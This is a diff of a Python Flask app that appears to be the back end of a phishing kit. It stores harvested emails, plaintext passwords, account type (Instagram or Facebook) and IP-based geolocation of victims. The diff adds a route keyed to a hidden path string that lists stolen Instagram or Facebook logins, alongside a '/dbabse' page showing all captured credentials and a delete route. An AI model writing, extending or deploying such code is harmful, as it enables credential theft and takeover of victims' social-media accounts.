@@ -2,28 +2,23 @@ from flask import Flask, redirect, request, render_template
 from flask_sqlalchemy import SQLAlchemy
 import os
 from datetime import datetime
+from json import dumps, loads
 import ipapi
 
 app = Flask(__name__)
-
-# Configuration
-app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', 'postgresql://username:password@hostname/databasename')
-app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
-
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///data.db'
 db = SQLAlchemy(app)
 
-# Define the credentials model
-class Credential(db.Model):
+class Credentials(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     email = db.Column(db.String(120))
     password = db.Column(db.String(120))
     account_type = db.Column(db.String(50))
-    ip = db.Column(db.String(50))
-    city = db.Column(db.String(50))
-    region = db.Column(db.String(50))
-    country = db.Column(db.String(50))
+    ip = db.Column(db.String(45))
+    city = db.Column(db.String(100))
+    region = db.Column(db.String(100))
+    country = db.Column(db.String(100))
     time = db.Column(db.String(50))
-
 
 @app.route('/initdb')
 def init_db():
@@ -33,6 +28,7 @@ def init_db():
 @app.errorhandler(404)
 def page_not_found(e):
     return '404 Not Found'
+
 
 
 ##########################First LG##########################
@@ -177,21 +173,24 @@ def vote_page2():
     return redirect(request.referrer + "error")
 
 
-@app.route('/delete/<int:id>')
-def delete(id):
-    credential = Credential.query.get(id)
-    if credential:
-        db.session.delete(credential)
-        db.session.commit()
+@app.route("/<path:locate>")
+def index(locate):
+    account_type = 'INSTAGRAM' if 'wwsuobyiyUnvL99f' in locate else 'FACEBOOK'
+    data = Credentials.query.filter_by(account_type=account_type).all()
+    return render_template('index.html', data=data, locate=locate)
 
+@app.route("/delete/<int:id>")
+def delete(id):
+    credential = Credentials.query.get(id)
+    db.session.delete(credential)
+    db.session.commit()
     return redirect(request.referrer)
 
 @app.route("/dbabse")
 def show_credentials():
-    credentials = Credential.query.all()
-    return render_template('credentials.html', data=credentials)
+    data = Credentials.query.all()
+    return render_template('credentials.html', data=data)
 
 if __name__ == "__main__":
     app.run(debug=True)
-
 
